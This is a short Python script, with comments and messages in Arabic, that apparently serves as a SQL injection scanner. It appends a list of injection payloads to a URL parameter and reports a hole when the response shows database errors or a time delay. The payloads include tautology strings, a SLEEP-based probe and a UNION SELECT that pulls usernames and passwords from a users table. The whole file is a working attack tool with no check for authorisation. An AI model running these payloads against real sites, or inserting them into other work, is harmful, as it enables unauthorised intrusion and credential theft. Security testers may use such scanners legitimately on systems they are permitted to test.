import requests
import time

def scan_sql_injection(url, param="id"):
    """
    يقوم بفحص الموقع لاكتشاف ثغرات SQL Injection باستخدام طرق أكثر دقة.
    :param url: عنوان الموقع الذي تريد فحصه.
    :param param: اسم المعامل المراد حقنه (افتراضي: "id").
    """
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR '1'='1' #",
        "' OR '1'='1' /*",
        "' OR '1'='1' AND SLEEP(5) -- ",
        "\" OR \"1\"=\"1",
        "' UNION SELECT null, null, null -- ",
        "' UNION SELECT username, password FROM users -- "
    ]
    
    
    error_messages = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "syntax error",
        "ORA-00933",  
        "SQLiteException",  
        "mysql_fetch_assoc",  
        "mysql_num_rows",  
        "pg_fetch_result",  
        "syntax error at or near"
    ]

    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            print(f"[*] تجربة الحمولة: {payload}")
            start_time = time.time()
            response = requests.get(target_url)
            response_time = time.time() - start_time

            
            for error in error_messages:
                if error.lower() in response.text.lower():
                    print(f"[+] تم اكتشاف ثغرة SQL Injection عند: {target_url} مع رسالة الخطأ: {error}")
                    return

            
            if "sleep" in payload and response_time > 4:
                print(f"[+] تم اكتشاف ثغرة SQL Injection تستند إلى الوقت عند: {target_url}")
                return

            print(f"[-] لم يتم اكتشاف ثغرة SQL Injection عند: {target_url}")

        except requests.exceptions.RequestException as e:
            print(f"[!] خطأ أثناء الاتصال بـ {target_url}: {e}")
